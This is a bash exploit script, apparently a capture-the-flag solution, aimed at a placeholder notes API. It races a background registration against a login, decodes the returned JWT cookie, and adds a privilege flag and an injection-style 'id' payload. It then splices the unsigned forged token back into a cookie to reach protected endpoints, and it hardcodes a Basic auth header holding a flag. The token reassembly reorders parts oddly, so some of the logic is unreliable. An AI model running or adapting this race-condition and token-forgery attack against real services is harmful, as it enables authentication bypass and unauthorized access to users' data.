#!/bin/bash

# This script exploits a race condition between user registration and login
# It sends a registration request in the background, then immediately attempts to login
# before the registration is fully processed, then manipulates the JWT token

# Base URL for all API calls
BASE_URL="http://xxx.com/secretbackend/api"

# Authentication header (Base64 encoded)
AUTH_HEADER="Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9"

# Create random username to avoid conflicts
USERNAME="speedrun_$(date +%s%N | md5sum | head -c 8)"
PASSWORD="pony123"
EMAIL="me@pony.tld"

echo "======== STEP 1: EXPLOITING RACE CONDITION ========"
echo "Username: $USERNAME"
echo "Password: $PASSWORD"

# Start registration process in background
echo "Starting registration in background..."
curl -sX POST "$BASE_URL/register" \
  -H "Authorization: $AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\",\"email\":\"$EMAIL\"}" &

# Store the PID of the background process
REG_PID=$!

# Critical timing for race condition
echo "Waiting 0.2 seconds to trigger race condition..."
sleep 0.2

# Attempt login while registration is still processing
echo "Attempting login before registration completes..."
LOGIN_RESPONSE=$(curl -sX POST "$BASE_URL/login" \
  -H "Authorization: $AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -D headers.txt \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")

# Print login response
echo -e "\n======== LOGIN RESPONSE ========"
echo "$LOGIN_RESPONSE"

# Extract and print all cookies from headers file
echo -e "\n======== COOKIES FROM HEADERS ========"
grep -i "set-cookie" headers.txt

# Extract the cookie from the headers
COOKIE=$(grep -i "set-cookie" headers.txt | cut -d' ' -f2)
echo -e "\nExact Cookie: $COOKIE"

# Split the cookie by dots to get JWT parts
COOKIE_PARTS=(${COOKIE//./ })

echo -e "\n======== JWT TOKEN ANALYSIS ========"
echo "Cookie part 1 (Header): ${COOKIE_PARTS[0]}"
echo "Cookie part 2 (Payload): ${COOKIE_PARTS[1]}"
echo "Cookie part 3 (Other): ${COOKIE_PARTS[2]}"
echo "Cookie part 4 (Signature): ${COOKIE_PARTS[3]}"

# Decode the JWT header
echo -e "\n======== JWT HEADER DECODED ========"
HEADER_DECODED=$(echo -n "${COOKIE_PARTS[0]}" | base64 -d 2>/dev/null || echo -n "${COOKIE_PARTS[0]}" | base64 -d -i)
echo "$HEADER_DECODED"

# URL decode and then base64 decode the JWT payload
echo -e "\n======== JWT PAYLOAD DECODED ========"
# URL decode first (handle %3D which is '=')
PAYLOAD_URL_DECODED=$(printf '%b' "${COOKIE_PARTS[1]//%/\\x}")
echo "URL-decoded payload (base64): $PAYLOAD_URL_DECODED"

# Now base64 decode
PAYLOAD_DECODED=$(echo -n "$PAYLOAD_URL_DECODED" | base64 -d 2>/dev/null || echo -n "$PAYLOAD_URL_DECODED" | base64 -d -i)
echo "Fully decoded payload (JSON): $PAYLOAD_DECODED"

echo -e "\n======== MODIFYING JWT PAYLOAD ========"
# Create modified payload with additional fields
if command -v jq &> /dev/null; then
  # Use jq to modify JSON
  MODIFIED_PAYLOAD=$(echo "$PAYLOAD_DECODED" | jq '. + {"is_d4rk_pr1nc3ss": true, "id": "$`IS\tFALSE\tUNION\t$`"}')
else
  # Fallback if jq not available
  MODIFIED_PAYLOAD=$(echo "$PAYLOAD_DECODED" | sed 's/}/, "is_d4rk_pr1nc3ss": true, "id": "$`IS\tFALSE\tUNION\t$`"}/')
fi

echo "Original payload:"
echo "$PAYLOAD_DECODED"
echo "Modified payload:"
echo "$MODIFIED_PAYLOAD"

# Encode the modified payload back to base64
ENCODED_PAYLOAD=$(echo -n "$MODIFIED_PAYLOAD" | base64 | tr -d '\n' | tr -d '=' | tr '/+' '_-')
echo "Encoded payload: $ENCODED_PAYLOAD"

# URL encode the base64 payload
URL_ENCODED_PAYLOAD=$(echo -n "$ENCODED_PAYLOAD" | while read -n1 c; do 
    case $c in
        [a-zA-Z0-9.~_-]) printf "%s" "$c" ;;
        *) printf "%%%02X" "'$c" ;;
    esac
done)
echo "URL-encoded payload: $URL_ENCODED_PAYLOAD"

# Create the new cookie with the modified payload
NEW_COOKIE="${COOKIE_PARTS[0]}.$URL_ENCODED_PAYLOAD.${COOKIE_PARTS[1]}.${COOKIE_PARTS[2]}"
echo "New cookie: $NEW_COOKIE"

echo -e "\n======== ACCESSING PROTECTED ENDPOINTS ========"
echo "Accessing secret-note endpoint:"
curl -sX GET "$BASE_URL/secret-note" \
  -H "Authorization: $AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -H "Cookie: $NEW_COOKIE"
echo -e "\n"

echo "Accessing notes endpoint:"
curl -sX GET "$BASE_URL/notes" \
  -H "Authorization: $AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -H "Cookie: $NEW_COOKIE"
echo -e "\n"

# Wait for background registration to complete
echo -e "\n======== REGISTRATION RESULT ========"
wait $REG_PID
echo "Registration process completed."

# Clean up temporary files
rm -f headers.txt

echo "Script completed."
